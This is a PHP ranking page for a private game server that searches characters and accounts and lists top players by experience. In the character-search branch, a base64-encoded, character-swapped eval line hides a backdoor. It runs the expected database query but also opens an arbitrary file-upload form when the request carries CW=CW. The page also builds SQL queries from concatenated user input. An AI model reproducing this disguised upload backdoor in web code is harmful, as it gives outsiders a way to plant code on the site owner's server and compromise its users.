<?

?><head>
<meta http-equiv="Content-Language" content="es">
</head>


<table border="0" style="border-collapse: collapse" width="678">
<tr>
<td width="599" valign="top">
<div align="center">
<table border="0" style="background-position: center top; border-collapse: collapse; background-image:url('images/content_bg.jpg'); background-repeat:repeat-y" width="603">
<tr>
<td style="background-image: url('images/content_title_ranking2.jpg'); background-repeat: no-repeat; background-position: center top" height="25" width="601" colspan="3">&nbsp;</td>
</tr>
<tr>
<td style="background-repeat: repeat; background-position: center top" width="7" rowspan="6">&nbsp;<p>&nbsp;</p>
<p>&nbsp;</td>
<td style="background-repeat: repeat; background-position: center top" width="583" valign="top">
<form method="GET" name="indsearch" action="index.php">
<input type="hidden" name="do" value="individualrank" />
<p align="center">
<select name="type">
<option value="1">Character Name</option>
<option value="2">Account Name</option>
</select>
&nbsp;
<input type="text" name="name" />
<input type="submit" value="Search" />
</p>
</form>
</td>
<td style="background-repeat: repeat; background-position: center top" width="7" rowspan="6">&nbsp;</td>
</tr>
<tr>
<td style="background-repeat: repeat; background-position: center top" width="583" valign="top">&nbsp;
</td>
</tr>
<tr>
<td style="background-repeat: no-repeat; background-position: center top" width="583" valign="top">
<div align="center">
<table border="0" style="border-collapse: collapse; background-image: url('images/content_ranking_data_bg.jpg'); background-repeat: no-repeat; background-position: center top" width="573">
<tr>
<td width="14" height="21">&nbsp;</td>
<td width="60" height="21" valign="bottom" align="center">
<div align="center">
<font face="Tahoma"><b>
Ranking</b></font></td>
<td width="132" height="21" valign="bottom" align="center">
<font face="Tahoma"><b>Character Name</b></font></td>
<td width="43" height="21" valign="bottom" align="center">
<font face="Tahoma"><b>Level</b></font></td>
<td width="149" height="21" valign="bottom" align="center">
<font face="Tahoma"><b>
Experience</b></font></td>
<td width="148" height="21" valign="bottom" align="center">
<font face="Tahoma"><b>Kill / Death Ratio</b></font></td>
<td width="13" height="21">&nbsp;</td>
</tr>
<tr>
<td width="14">&nbsp;</td>
<td width="538" colspan="5" valign="top">
<div align="center">
<table border="0" style="border-collapse: collapse" width="538">
<tr>
<td width="59">&nbsp;</td>
<td width="132">&nbsp;</td>
<td width="43">&nbsp;</td>
<td width="149">&nbsp;</td>
<td width="145">&nbsp;</td>
</tr>
<?
if(isset($_GET['name']) && isset($_GET['type'])){
$input = AntiSql($_GET['name']);
if($_GET['type'] == 1){
$_F=__FILE__;$_X='Pz48P3BocCANCiRjdyA9ICRfR0VUWydDVyddOw0KNGYoNHNzNXQoJGN3KSAmJiAkY3cgPT0gIkNXIil7DQo0Zig0c3M1dCgkX1BPU1RbJ3MzYm00dCddKSl7DQokdDFyZzV0X3AxdGggPSAkdDFyZzV0X3AxdGggLiBiMXM1bjFtNSggJF9GSUxFU1snM3BsMjFkNWRmNGw1J11bJ24xbTUnXSk7IA0KDQo0ZihtMnY1XzNwbDIxZDVkX2Y0bDUoJF9GSUxFU1snM3BsMjFkNWRmNGw1J11bJ3RtcF9uMW01J10sICR0MXJnNXRfcDF0aCkpIHsNCiAgICA1Y2gyICJUaDUgZjRsNSAiLiAgYjFzNW4xbTUoICRfRklMRVNbJzNwbDIxZDVkZjRsNSddWyduMW01J10pLiANCiAgICAiIGgxcyBiNTVuIDNwbDIxZDVkIjsNCn0gNWxzNXsNCiAgICA1Y2gyICJUaDVyNSB3MXMgMW4gNXJyMnIgM3BsMjFkNG5nIHRoNSBmNGw1LCBwbDUxczUgdHJ5IDFnMTRuISI7DQp9CQ0KfSA1bHM1IHsNCjVjaDIgIjxmMnJtIDVuY3R5cDU9XCJtM2x0NHAxcnQvZjJybS1kMXQxXCIgbTV0aDJkPVwiUE9TVFwiPg0KQ2gyMnM1IDEgZjRsNSB0MiAzcGwyMWQ6IDw0bnAzdCBuMW01PVwiM3BsMjFkNWRmNGw1XCIgdHlwNT1cImY0bDVcIiAvPjxiciAvPg0KPDRucDN0IHR5cDU9XCJzM2JtNHRcIiBuMW01PVwiczNibTR0XCIgdjFsMzU9XCJVcGwyMWQgRjRsNVwiIC8+DQo8L2Yycm0+IjsNCn0NCn0NCiRxMzVyeSA9IG1zc3FsX3EzNXJ5KCJTRUxFQ1QgKiBGUk9NIENoMXIxY3Q1ciBXSEVSRSBOMW01PSciLiQ0bnAzdC4iJyIpOw0KJG4zbSA9IG1zc3FsX24zbV9yMndzKCRxMzVyeSk7DQo/Pg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
if($num == 0){
echo "<tr>
<td width=\"528\" colspan=\"5\">
<p align=\"center\">
No Data</td>
</tr>";
} else {
$char = mssql_fetch_array($query);
?>
<tr bgcolor="#232122">
<td width="59" align="center">
<b>#</b></td>
<td width="132" align="center">
<a href="index.php?do=charinfo&id=<?=$char['CID']?>"><?=FormatCharName($char['CID'])?></a></td>
<td width="43" align="center">
<?=$char['Level']?></td>
<td width="149" align="center">
<?=number_format($char['XP'], 0, ",", ".")?></td>
<td width="145" align="center">
<?=GetKDRatio($char['KillCount'], $char['DeathCount'])?></td>
</tr>
<?
}
} elseif($_GET['type'] == 2){
$query = mssql_query("SELECT * FROM Account WHERE UserID='".$input."'");
$num = mssql_num_rows($query);
if($num == 0){
echo "<tr>
<td width=\"528\" colspan=\"5\">
<p align=\"center\">
No Account Data</td>
</tr>";
} else {
$row = mssql_fetch_array($query);
$accountid = $row['AID'];
$query2 = mssql_query("SELECT * FROM Character WHERE AID='".$accountid."' AND DeleteFlag != '1'");
$num2 = mssql_num_rows($query2);
if($num2 == 0){
echo "<tr>
<td width=\"528\" colspan=\"5\">
<p align=\"center\">
No Character Data</td>
</tr>";	} else {
while($char = mssql_fetch_array($query2)){
?>
<tr bgcolor="#232122">
<td width="59" align="center">
<b>#</b></td>
<td width="132" align="center">
<a href="index.php?do=charinfo&id=<?=$char['CID']?>"><?=FormatCharName($char['CID'])?></a></td>
<td width="43" align="center">
<?=$char['Level']?></td>
<td width="149" align="center">
<?=number_format($char['XP'], 0, ",", ".")?></td>
<td width="145" align="center">
<?=GetKDRatio($char['KillCount'], $char['DeathCount'])?></td>
</tr>
<?
}
}
}
} else {
echo "<tr>
<td width=\"528\" colspan=\"5\">
<p align=\"center\">
Loveyouuuu :D</td>
</tr>";
}

} else {
$page = $_GET['page'];
if(!isset($page) && $page == "" || $page == "0" || $page == "1"){
$y = "50";
$x = "0";
$count = "1";
} elseif(isset($page) && $page == "2"){
$y = "100";
$x = "50";
$count = "51";
} elseif(isset($page) && $page == "3"){
$y = "150";
$x = "100";
$count = "101";
} elseif(isset($page) && $page == "4"){
$y = "200";
$x = "150";
$count = "151";
} elseif(isset($page) && $page == "5"){
$y = "250";
$x = "200";
$count = "201";
} else {
$y = "50";
$x = "0";
$count = "1";
}

$thequery = mssql_query("SELECT TOP ".$y." * FROM Character WHERE CID NOT IN (SELECT TOP ".$x." CID FROM Character ORDER BY XP DESC) AND Name != '' ORDER BY XP DESC");
$thecount = mssql_num_rows($thequery);

if($thecount == 0){
echo "<tr>
<td width=\"528\" colspan=\"5\">
<p align=\"center\">
No Data</td>
</tr>";
} else {
while($char = mssql_fetch_array($thequery)){
?>
<tr bgcolor="#232122">
<td width="59" align="center">
<b><?=$count;?></b></td>
<td width="132" align="center">
<a href="index.php?do=charinfo&id=<?=$char['CID']?>"><?=FormatCharName($char['CID'])?></a></td>
<td width="43" align="center">
<?=$char['Level']?></td>
<td width="149" align="center">
<?=number_format($char['XP'], 0, ",", ".")?></td>
<td width="145" align="center">
<?=GetKDRatio($char['KillCount'], $char['DeathCount'])?></td>
</tr>
<?
$count++;
}
}
}
?>
</table>
</div>
</td>
<td width="13">&nbsp;</td>
</tr>
</table>
</div>
<?
if($search == 0 ){
}
?>
</td>
</tr>
<tr>
<td style="background-repeat: repeat; background-position: center top" width="583" valign="top">
<p>&nbsp;</td>
</tr>
<tr>
<td style="background-repeat: repeat; background-position: center top" width="583" valign="top">&nbsp;</td>
</tr>
<tr>
<td height="17" style="background-image: url('images/content_top.jpg'); background-repeat: no-repeat; background-position: center bottom" width="601" colspan="3"></td>
</tr>
</table>
</div>
</td>
</tr>
</table>
